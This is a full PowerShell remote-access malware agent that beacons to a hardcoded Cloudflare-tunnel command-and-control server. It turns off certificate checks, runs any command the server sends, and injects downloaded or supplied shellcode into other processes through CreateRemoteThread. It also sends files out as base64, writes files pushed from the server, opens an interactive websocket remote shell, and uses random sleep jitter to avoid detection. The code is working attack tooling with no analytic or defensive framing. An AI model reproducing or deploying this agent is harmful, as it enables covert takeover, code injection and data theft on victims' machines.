# Enhanced PowerShell C2 Agent - FastAPI Version
# Compatible with PowerShell 5.1 and PowerShell 7+
# Connects to main.py BITS C2 integration on port 8000

# ========== CONFIGURE THIS ==========
$C2_URL = "https://mandatory-zip-installing-illinois.trycloudflare.com"
# ====================================

$ServerUrl = "$C2_URL/bits"
$AgentId = $env:COMPUTERNAME + "_" + $env:USERNAME
$SecretKey = "964fb7928cd27b5faf3b8971e5befcf6"

# SSL/TLS setup - PS5/PS7 compatible
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
if ($PSVersionTable.PSVersion.Major -le 5) {
    try {
        Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
        [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
    } catch {}
}

# Function to generate HMAC-SHA256 signature
function Get-AuthHeaders {
    $timestamp = [int][double]::Parse((Get-Date -UFormat %s))
    $message = "$AgentId$timestamp"
    
    # HMAC-SHA256
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($SecretKey)
    $hash = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($message))
    $signature = [BitConverter]::ToString($hash).Replace("-", "").ToLower()
    
    return @{
        "X-Agent-ID" = $AgentId
        "X-Timestamp" = $timestamp.ToString()
        "X-Signature" = $signature
        "X-API-Key" = $SecretKey
    }
}

# Injection functions
function Inject-Shellcode {
    param([byte[]]$Shellcode, [int]$ProcessId)
    
    try {
        # Win32 API definitions
        $Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@
        
        Add-Type -TypeDefinition $Kernel32
        
        # Process access flags
        $PROCESS_ALL_ACCESS = 0x1F0FFF
        
        # Memory allocation flags
        $MEM_COMMIT = 0x1000
        $MEM_RESERVE = 0x2000
        $PAGE_EXECUTE_READWRITE = 0x40
        
        # Open process
        $hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $ProcessId)
        if ($hProcess -eq [IntPtr]::Zero) {
            return "Failed to open process $ProcessId"
        }
        
        # Allocate memory
        $remoteAddr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $Shellcode.Length, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_EXECUTE_READWRITE)
        if ($remoteAddr -eq [IntPtr]::Zero) {
            [Kernel32]::CloseHandle($hProcess)
            return "Failed to allocate memory in process $ProcessId"
        }
        
        # Write shellcode
        $bytesWritten = 0
        $writeResult = [Kernel32]::WriteProcessMemory($hProcess, $remoteAddr, $Shellcode, $Shellcode.Length, [ref]$bytesWritten)
        if (-not $writeResult) {
            [Kernel32]::CloseHandle($hProcess)
            return "Failed to write shellcode to process $ProcessId"
        }
        
        # Create remote thread
        $threadHandle = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $remoteAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        if ($threadHandle -eq [IntPtr]::Zero) {
            [Kernel32]::CloseHandle($hProcess)
            return "Failed to create remote thread in process $ProcessId"
        }
        
        [Kernel32]::CloseHandle($threadHandle)
        [Kernel32]::CloseHandle($hProcess)
        
        return "Successfully injected shellcode into process $ProcessId"
    }
    catch {
        return "Injection error: $($_.Exception.Message)"
    }
}

function Get-ProcessList {
    try {
        $procs = Get-Process | Select-Object Id, Name, CPU, WS | Sort-Object -Property WS -Descending
        $output = "PID`tNAME`t`t`t`tCPU`tMEM`n"
        $output += "=" * 70 + "`n"
        foreach ($p in $procs) {
            $ws = [math]::Round($p.WS / 1MB, 2)
            $cpu = if ($p.CPU) { [math]::Round($p.CPU, 2) } else { "0" }
            $name = $p.Name.PadRight(24).Substring(0,24)
            $output += "$($p.Id)`t$name`t$cpu`t${ws}MB`n"
        }
        return $output
    }
    catch {
        return "Error getting process list: $($_.Exception.Message)"
    }
}

function Start-PtySession {
    # Run PTY in background job so BITS continues
    $ptyJob = Start-Job -ScriptBlock {
        param($wsUrl)
        
        try {
            $ws = New-Object System.Net.WebSockets.ClientWebSocket
            $connectTask = $ws.ConnectAsync([Uri]$wsUrl, [System.Threading.CancellationToken]::None)
            while (-not $connectTask.IsCompleted) { Start-Sleep -Milliseconds 100 }
            
            if ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) { return }
            
            # Send init
            $initBytes = [Text.Encoding]::UTF8.GetBytes("{`"role`":`"agent`"}")
            $sendTask = $ws.SendAsync([System.ArraySegment[byte]]::new($initBytes), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
            while (-not $sendTask.IsCompleted) { Start-Sleep -Milliseconds 10 }
            
            # Send banner  
            $banner = "=== TTY $env:COMPUTERNAME ===`r`nPS $env:USERPROFILE> "
            $bannerBytes = [Text.Encoding]::UTF8.GetBytes($banner)
            $sendTask = $ws.SendAsync([System.ArraySegment[byte]]::new($bannerBytes), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
            while (-not $sendTask.IsCompleted) { Start-Sleep -Milliseconds 10 }
            
            $recvBuf = New-Object byte[] 8192
            $cmdBuffer = ""
            $recvTask = $null
            
            while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
                if ($recvTask -eq $null) {
                    $recvTask = $ws.ReceiveAsync([System.ArraySegment[byte]]::new($recvBuf), [System.Threading.CancellationToken]::None)
                }
                
                if ($recvTask.IsCompleted) {
                    if ($recvTask.Status -eq "RanToCompletion") {
                        $result = $recvTask.Result
                        if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) { break }
                        
                        if ($result.Count -gt 0) {
                            $input = [Text.Encoding]::UTF8.GetString($recvBuf, 0, $result.Count)
                            if ($input -eq "ping") { $recvTask = $null; continue }
                            
                            $cmdBuffer += $input
                            
                            if ($cmdBuffer -match "[\r\n]") {
                                $cmd = $cmdBuffer.Trim()
                                $cmdBuffer = ""
                                
                                if ($cmd -eq "exit") { break }
                                
                                if ($cmd.Length -gt 0) {
                                    try { $output = Invoke-Expression $cmd 2>&1 | Out-String } 
                                    catch { $output = "Error: $_" }
                                    if (-not $output) { $output = "[OK]" }
                                    
                                    $response = "$output`r`nPS $PWD> "
                                    $respBytes = [Text.Encoding]::UTF8.GetBytes($response)
                                    if ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
                                        $sendTask = $ws.SendAsync([System.ArraySegment[byte]]::new($respBytes), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
                                        while (-not $sendTask.IsCompleted -and $ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) { 
                                            Start-Sleep -Milliseconds 10 
                                        }
                                    }
                                }
                            }
                        }
                        $recvTask = $null
                    } elseif ($recvTask.Status -eq "Faulted" -or $recvTask.Status -eq "Canceled") {
                        break
                    }
                }
                Start-Sleep -Milliseconds 30
            }
            try { $ws.Dispose() } catch {}
        } catch {}
    } -ArgumentList @("$($ServerUrl -replace '/bits$', '' -replace '^https://', 'wss://' -replace '^http://', 'ws://')/tty/$AgentId")
    
    # Return immediately - PTY runs in background
}
# Main loop - auto-registers on first command poll
#Write-Host "[*] Agent starting: $AgentId"
while ($true) {
    try {
        # Get fresh auth headers for each request (timestamp changes)
        $Headers = Get-AuthHeaders
        
        # Get command (auto-registers if new agent)
        $irmParams = @{
            Uri = "$ServerUrl/cmd/$AgentId"
            Method = 'Get'
            Headers = $Headers
            UseBasicParsing = $true
        }
        if ($PSVersionTable.PSVersion.Major -ge 6) { $irmParams['SkipCertificateCheck'] = $true }
        $response = Invoke-RestMethod @irmParams
        $command = $response.command
        
        if ($command -and $command -ne "") {
            #Write-Host "[>] Command: $command"
            
            # Handle special commands
            if ($command -eq "ps") {
                $result = Get-ProcessList
            }
            elseif ($command -match "^inject\s+(\d+)\s+(.+)$") {
                $pid = [int]$Matches[1]
                $b64Shellcode = $Matches[2]
                
                try {
                    $shellcode = [Convert]::FromBase64String($b64Shellcode)
                    $result = Inject-Shellcode -Shellcode $shellcode -ProcessId $pid
                }
                catch {
                    $result = "Failed to decode shellcode: $($_.Exception.Message)"
                }
            }
            elseif ($command -match "^injectsc\s+(\d+)$") {
                # Download shellcode from C2 with token and inject
                $targetPid = [int]$Matches[1]
                try {
                    $scUrl = "$C2_URL/payloads/shellcode.txt?key=$TOKEN"
                    $dlParams = @{ Uri = $scUrl; Method = 'Get'; UseBasicParsing = $true }
                    if ($PSVersionTable.PSVersion.Major -ge 6) { $dlParams['SkipCertificateCheck'] = $true }
                    $scB64 = (Invoke-WebRequest @dlParams).Content
                    $shellcode = [Convert]::FromBase64String($scB64)
                    $result = Inject-Shellcode -Shellcode $shellcode -ProcessId $targetPid
                }
                catch {
                    $result = "injectsc error: $($_.Exception.Message)"
                }
            }
            elseif ($command -match "^download\s+(.+)$") {
                $filePath = $Matches[1]
                try {
                    if (Test-Path $filePath) {
                        $content = [System.IO.File]::ReadAllBytes($filePath)
                        $b64 = [Convert]::ToBase64String($content)
                        $result = "FILE_DOWNLOAD:$b64"
                    } else {
                        $result = "File not found: $filePath"
                    }
                }
                catch {
                    $result = "Download error: $($_.Exception.Message)"
                }
            }
            elseif ($command -match "^upload\s+(.+?)\s+(.+)$") {
                $filePath = $Matches[1]
                $b64Content = $Matches[2]
                try {
                    $bytes = [Convert]::FromBase64String($b64Content)
                    [System.IO.File]::WriteAllBytes($filePath, $bytes)
                    $result = "File uploaded: $filePath"
                }
                catch {
                    $result = "Upload error: $($_.Exception.Message)"
                }
            }
            else {
                # Execute command
                try {
                    $result = iex $command 2>&1 | Out-String
                    if ([string]::IsNullOrEmpty($result)) { $result = "OK" }
                }
                catch {
                    $result = "Error: $($_.Exception.Message)"
                }
            }
            
            # Send result
            $body = @{ result = $result } | ConvertTo-Json
            $postParams = @{
                Uri = "$ServerUrl/result/$AgentId"
                Method = 'Post'
                Body = $body
                ContentType = 'application/json'
                Headers = $Headers
                UseBasicParsing = $true
            }
            if ($PSVersionTable.PSVersion.Major -ge 6) { $postParams['SkipCertificateCheck'] = $true }
            Invoke-RestMethod @postParams | Out-Null
            #Write-Host "[<] Result sent: $($result.Length) bytes"
        }
    }
    catch {
        # Silently handle errors and continue
    }
    

        # Check for TTY request
        try {
            $ptyUri = ($ServerUrl -replace "/bits$", "") + "/bits/pty-status/$AgentId"
            $ptyParams = @{ Uri = $ptyUri; Method = "Get"; Headers = $Headers; UseBasicParsing = $true }
            if ($PSVersionTable.PSVersion.Major -ge 6) { $ptyParams["SkipCertificateCheck"] = $true }
            $ptyResp = Invoke-RestMethod @ptyParams
            if ($ptyResp.pty_requested -eq $true) { Start-PtySession }
        } catch {}
    
    # Random jitter: 2-8 seconds (avoids detection patterns)
    $jitter = Get-Random -Minimum 2 -Maximum 8
    Start-Sleep -Seconds $jitter
}
